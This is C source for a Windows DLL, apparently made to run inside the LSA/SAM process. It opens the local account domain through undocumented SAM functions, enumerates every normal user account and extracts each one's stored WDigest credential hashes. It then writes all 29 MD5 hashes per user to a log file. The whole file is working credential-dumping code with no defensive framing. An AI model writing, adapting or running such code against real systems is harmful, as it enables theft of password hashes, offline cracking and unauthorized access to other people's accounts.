#define _WIN32_WINNT    0x0400

#include "../samsrv/samsrv.h"
#include "../shared/shared.h"

#define DOUTST2(api, status)        DOUTST("lsamod2", api, status)


SAMPR_HANDLE            sam_server = NULL;
SAMPR_HANDLE            sam_domain = NULL;

const char dout_file[] = "lsamod2.log";


//#define RETRIEVE_PRIMARY_DOMAIN_INFO

#ifdef RETRIEVE_PRIMARY_DOMAIN_INFO
#define POLICY_ACCOUNT_DOMAIN_INFO_         POLICY_PRIMARY_DOMAIN_INFO
#define PolicyAccountDomainInformation_     PolicyPrimaryDomainInformation
#define pdomain_info_DomainName             pdomain_info->Name
#define pdomain_info_DomainSid              pdomain_info->Sid 
#else
#define POLICY_ACCOUNT_DOMAIN_INFO_         POLICY_ACCOUNT_DOMAIN_INFO
#define PolicyAccountDomainInformation_     PolicyAccountDomainInformation
#define pdomain_info_DomainName             pdomain_info->DomainName
#define pdomain_info_DomainSid              pdomain_info->DomainSid 
#endif

void WINAPI opd(void){
    LSA_OBJECT_ATTRIBUTES           objattr;
    LSA_HANDLE                      h_policy;
    POLICY_ACCOUNT_DOMAIN_INFO_     *pdomain_info;
    SAMPR_HANDLE                    ssrv = NULL;
    SAMPR_HANDLE                    sdomain = NULL;
    NTSTATUS                        status;
    char                            dname[64];

    if((sam_server != NULL) || (sam_domain != NULL)){
        dout("The domain has already been opened.\n");
        return;
    }

    memset(&objattr, 0, sizeof(objattr));
    objattr.Length = sizeof(objattr);

    if((status = LsaOpenPolicy(NULL, &objattr, POLICY_VIEW_LOCAL_INFORMATION, &h_policy)) != STATUS_SUCCESS){
        DOUTST2("LsaOpenPolicy", status);
        return;
    }

    if((status = LsaQueryInformationPolicy(h_policy, PolicyAccountDomainInformation_, &pdomain_info)) != STATUS_SUCCESS){
        DOUTST2("LsaQueryInformationPolicy", status);
        LsaClose(h_policy);
        return;
    }

    if((status = SamIConnect(NULL, &ssrv, 0, SAM_SERVER_CONNECT)) != STATUS_SUCCESS){
        DOUTST2("SamIConnect", status);
        LsaFreeMemory(pdomain_info);
        LsaClose(h_policy);
        return;
    }

    if(unicode2ansi(pdomain_info_DomainName.Buffer, pdomain_info_DomainName.Length, dname, sizeof(dname)) == 0){
        strcpy(dname, "<unknown>");
    }

    dout(va("Current domain is %s.\n", dname));

    if((status = SamrOpenDomain(ssrv, DOMAIN_LOOKUP | DOMAIN_LIST_ACCOUNTS | DOMAIN_READ_OTHER_PARAMETERS, pdomain_info_DomainSid, &sdomain)) != STATUS_SUCCESS){
        DOUTST2("SamrOpenDomain", status);
        SamrCloseHandle(ssrv);
        LsaFreeMemory(pdomain_info);
        LsaClose(h_policy);
        return;
    }


    if(0){
        PSAMPR_DOMAIN_INFO_BUFFER        pdomain_info = NULL;

        if((status = SamrQueryInformationDomain(sdomain, DomainNameInformation, &pdomain_info)) != STATUS_SUCCESS){
            DOUTST2("SamrQueryInformationDomain", status);
        }else{

            /*
            if(IsDebuggerPresent()){
                DebugBreak();
            }else{
                dout("NOTE: Debugger seems to be NOT present\n");
            }
            */
            


            status = SamIFree_SAMPR_DOMAIN_INFO_BUFFER(pdomain_info, DomainNameInformation);
            // dout(va("NOTE: SamIFree_SAMPR_DOMAIN_INFO_BUFFER returned %08X\n", status));
        }
    }

    LsaFreeMemory(pdomain_info);
    LsaClose(h_policy);

    sam_server = ssrv;
    sam_domain = sdomain;

    dout(va("The domain has been OPENED.\n", dname));
}

void WINAPI enu(void){
    long                context;
    WCHAR               w_password[] = L"WDigest";
    UNICODE_STRING      u_password = {sizeof(w_password) - sizeof(WCHAR), sizeof(w_password) - sizeof(WCHAR), w_password};


    dout("Starting to enumerate users...\n");

    context = 0;
    for(;;){
        PSAMPR_ENUMERATION_BUFFER   buf;
        unsigned long               cnt;
        unsigned int                i;
        long                        status2;

        status2 = SamrEnumerateUsersInDomain(sam_domain, &context, UF_NORMAL_ACCOUNT, &buf, 1000, &cnt);
        if((status2 == STATUS_SUCCESS) || (status2 == STATUS_MORE_ENTRIES)){
            for(i = 0; i < cnt; i++){
                char                        astr[64];
                PUNICODE_STRING             uname;
                PSAMPR_USER_INFO_BUFFER     puser_info_buffer;
                SidAndAttributesList        sidattr;
                SAMPR_HANDLE                sam_user;
                PWDIGEST_CREDENTIALS        pwdigest_creds;
                long                        cred_sz;
                long                        status;

                uname = &buf->Buffer[i].Name;

                if(unicode2ansi(uname->Buffer, uname->Length, astr, sizeof(astr)) == 0){
                    dout("FATAL: unicode2ansi failed\n");
                    continue;
                }

                dout(va("User %2u: [%s]\n", i, astr));

                // open sam account here
                status = SamIGetUserLogonInformationEx(sam_domain, 0, uname, /*0x1BE40D*/0, &puser_info_buffer, &sidattr, &sam_user);
                if(status != STATUS_SUCCESS){
                    DOUTST2("SamIGetUserLogonInformationEx", status);
                    continue;
                }

                SamIFree_SAMPR_USER_INFO_BUFFER(puser_info_buffer, UserAllInformation);
                SamIFreeSidAndAttributesList(&sidattr);

                status = SamIRetrievePrimaryCredentials(sam_user, &u_password, &pwdigest_creds, &cred_sz);
                if(status != STATUS_SUCCESS){
                    DOUTST2("SamIRetrievePrimaryCredentials", status);
                }else{
                    if(cred_sz != sizeof(WDIGEST_CREDENTIALS)){
                        dout(va("WDigest credentials size mismatrch: %u != %u\n", cred_sz, sizeof(WDIGEST_CREDENTIALS)));
                    }else{
                        HASHHEX     hex;

                        dout(va(
                            "WDIGEST_CREDENTIALS\n"
                            "  Version: %u\n"
                            "  NumberOfHashes: %u\n",
                            pwdigest_creds->Version,
                            pwdigest_creds->NumberOfHashes
                        ));

#define SHOWMD5(hash)       CvtHex(pwdigest_creds->hash, hex); dout(va("  " #hash ": %s\n", hex))
                        SHOWMD5(Hash1);
                        SHOWMD5(Hash2);
                        SHOWMD5(Hash3);
                        SHOWMD5(Hash4);
                        SHOWMD5(Hash5);
                        SHOWMD5(Hash6);
                        SHOWMD5(Hash7);
                        SHOWMD5(Hash8);
                        SHOWMD5(Hash9);
                        SHOWMD5(Hash10);
                        SHOWMD5(Hash11);
                        SHOWMD5(Hash12);
                        SHOWMD5(Hash13);
                        SHOWMD5(Hash14);
                        SHOWMD5(Hash15);
                        SHOWMD5(Hash16);
                        SHOWMD5(Hash17);
                        SHOWMD5(Hash18);
                        SHOWMD5(Hash19);
                        SHOWMD5(Hash20);
                        SHOWMD5(Hash21);
                        SHOWMD5(Hash22);
                        SHOWMD5(Hash23);
                        SHOWMD5(Hash24);
                        SHOWMD5(Hash25);
                        SHOWMD5(Hash26);
                        SHOWMD5(Hash27);
                        SHOWMD5(Hash28);
                        SHOWMD5(Hash29);
#undef SHOWMD5

                        dout(va(
                            "WDIGEST_CREDENTIALS\n"
                        ));
                    }

                    LocalFree(pwdigest_creds);
                }

                SamrCloseHandle(sam_user);
            }

            SamIFree_SAMPR_ENUMERATION_BUFFER(buf);
        }else{
            DOUTST2("SamrEnumerateUsersInDomain", status2);
            break;
        }

        if(status2 == STATUS_SUCCESS){
            break;
        }
    }

    dout("Finished enumerating users.\n");
}

void WINAPI cld(void){
    SamrCloseHandle(sam_domain);
    SamrCloseHandle(sam_server);

    sam_domain = NULL;
    sam_server = NULL;

    dout("Current domain has been CLOSED.\n");
}

/////////////////////////////

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
    switch (fdwReason){
    case DLL_PROCESS_DETACH:
        dout_close();
        return TRUE;
    default:
        return TRUE;
    }
}

